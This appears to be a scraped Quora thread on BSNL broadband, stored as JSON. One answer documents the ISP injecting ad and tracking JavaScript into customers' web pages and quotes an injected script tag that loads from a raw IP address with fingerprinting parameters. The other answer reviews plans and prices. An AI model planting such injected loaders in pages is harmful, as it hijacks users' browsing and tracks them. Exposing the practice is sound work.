@@ -1,0 +1,113 @@
+{
+    "title": "How is bsnl broadband? - Quora",
+    "tags": [
+        "Bharat Sanchar Nigam Limited (BSNL)",
+        "Broadband"
+    ],
+    "response": [
+        {
+            "author_info": {
+                "name": "Benjamin Mailian",
+                "href": "/profile/Benjamin-Mailian"
+            },
+            "answer_text": "BSNL broadband is a mixed bag. Admittedly BSNL has served a valuable public function for a crazy large number of customers in cities and rural parts of India. Unfortunately, they have the awful practice of injecting ads into their customer\u2019s browsers. I\u2019ve seen them highjack my http request to redirect me to a new page before, which is bad enough. But more recently, I noticed (in Ahmedabad) a more sinister approach where they inject javascript in the head tag of a random website, causing any click on the page to open a spammy website in a new window. In the two screenshots below, I opened up the developer tools and highlighted the injected javascript that causes the browser to open a new window.   You can see a video recording of the behaviour here: http://recordit.co/miCZyoMUev (sorry for the slow load time, BSNL :) ) Here are two example of ads that were served to me with the BSNL script injection:   These are not benign ads, BSNL is promoting ads that prompt users to install questionable and possibly malicious software onto their customer\u2019s machines. At first I thought maybe I had some malware on my Mac (unlikely but not impossible) but when nothing turned up and after turning off all my browser extensions, I decided to dig deeper. The IP addresses that are serving the injected scripts are identifiably BSNL addresses.  How do I know the above sites I visited were not already compromised when I visited them? Both of the sites in this answer are sites that I host and manage. They are static HTML pages (built with a static site generator). There is no database and no dynamic scripting language generating these pages. I can and did verify the code that is on the server. This is one instance of script that was used. <script async=\"\" src=\"//117.240.205.115:3000/getjs?nadipdata=&quot;%7B%22url%22:%22%2Fpublished%2Fjquery.ubpoverlay-d9900bb.z.js%22%2C%22referer%22:%22http:%2F%2Fresources.auth0.com%2Fbuild-vs-buy-evaluating-identity-management%2F%22%2C%22host%22:%22builder-assets.unbounce.com%22%2C%22categories%22:%5B0%5D%2C%22reputations%22:%5B1%5D%7D&quot;&amp;screenheight=900&amp;screenwidth=1440&amp;tm=1530246875844&amp;lib=true&amp;fingerprint=c2VwLW5vLXJlZGlyZWN0\"></script>\u00a0Fun fact, the fingerprint attribute \u2018c2VwLW5vLXJlZGlyZWN0\u2019 in the script above is the same across all the sites I visit. This means advertisers are tracking me. It\u2019s not a cookie from a domain/IP that I am able to find or delete. Additionally, this happens in private browsing/incognito windows. I believe HTTPS sites don\u2019t suffer from this problem. It\u2019s a very unfortunate practice. ",
+            "date": "Answered June 29, 2018",
+            "views": "86",
+            "upvotes": " View 22 Upvoters",
+            "upvoters": [
+                {
+                    "user_id": "Sunil Singh",
+                    "user_href": "/profile/Sunil-Singh-244"
+                },
+                {
+                    "user_id": "Moin Ullah",
+                    "user_href": "/profile/Moin-Ullah-1"
+                },
+                {
+                    "user_id": "Shalender",
+                    "user_href": "/profile/Shalender-1"
+                },
+                {
+                    "user_id": "Hbx Hyderabadi Boys",
+                    "user_href": "/profile/Hbx-Hyderabadi-Boys"
+                },
+                {
+                    "user_id": "Meer",
+                    "user_href": "/profile/Meer-12"
+                },
+                {
+                    "user_id": "Abhishek Raj",
+                    "user_href": "/profile/Abhishek-Raj-427"
+                },
+                {
+                    "user_id": "Arijit Roy",
+                    "user_href": "/profile/Arijit-Roy-177"
+                },
+                {
+                    "user_id": "S S",
+                    "user_href": "/profile/S-S-1835"
+                },
+                {
+                    "user_id": "Meghrajsinh Rana",
+                    "user_href": "/profile/Meghrajsinh-Rana-3"
+                },
+                {
+                    "user_id": "Shaira",
+                    "user_href": "/profile/Shaira-36"
+                }
+            ]
+        },
+        {
+            "author_info": {
+                "name": "Shivam Yadav",
+                "href": "/profile/Shivam-Yadav-8"
+            },
+            "answer_text": "Luckily my experience with BSNL boradband has been good. I have used it at 2 different places i.e Meerut and Bhopal First Meerut I used to live in Cantt. area so BSNL was the only hope. My home was about 1Km from BSNL exchange and used to get minimum 2Mbps (since the minimum bandwidth had been increased to 2Mbps) in Meerut + those unlimited calls on Sundays and in the night. While in Bhopal I live in M P Nagar which is commercial hub of Bhopal. While applying for the new connection just had to visit BSNL office once, there I was provided with the number of a man. Called that man, he came to my address got all the paperwork done. This man told me about a Rs.750 plan in which you get 10Mbps speed with 100GB FUP. Applied for that plan and in 3 days my internet was working. Consumed 100GB in the first 10 days. I was hoping that the speed would come down to 2Mbps but it was not the case and I was still getting 10mbps So I ended up using around 400GB in the first month. It has been working really good for me till now. Also I get unlimited calling (Local+STD) at extra payment of only Rs.98 So the total bill that I get is of RS.1000(including taxes) a month in which I literally get unlimited data at 10Mbps and Unlimited calls. There are special plans in every circle, I guess. You just need to find it. Anyone in Bhopal can get this Rs.750 plan for the time being. ",
+            "date": "Answered April 7, 2018",
+            "views": "52",
+            "upvotes": " View 11 Upvoters",
+            "upvoters": [
+                {
+                    "user_id": "Hariom Amrite",
+                    "user_href": "/profile/Hariom-Amrite"
+                },
+                {
+                    "user_id": "Adarsh Sharma",
+                    "user_href": "/profile/Adarsh-Sharma-482"
+                },
+                {
+                    "user_id": "Mahi Mahesh Babu",
+                    "user_href": "/profile/Mahi-Mahesh-Babu"
+                },
+                {
+                    "user_id": "Chandrashekar Subramanian",
+                    "user_href": "/profile/Chandrashekar-Subramanian-1"
+                },
+                {
+                    "user_id": "Shourya Rai",
+                    "user_href": "/profile/Shourya-Rai-11"
+                },
+                {
+                    "user_id": "Aryan Abhinav",
+                    "user_href": "/profile/Aryan-Abhinav-1"
+                },
+                {
+                    "user_id": "ALL IN ELITE",
+                    "user_href": "/profile/ALL-IN-ELITE"
+                },
+                {
+                    "user_id": "Sreehari A",
+                    "user_href": "/profile/Sreehari-A-9"
+                },
+                {
+                    "user_id": "Amanat Rasool",
+                    "user_href": "/profile/Amanat-Rasool-3"
+                },
+                {
+                    "user_id": "Satya Narayana",
+                    "user_href": "/profile/Satya-Narayana-115"
+                }
+            ]
+        }
+    ]
+}
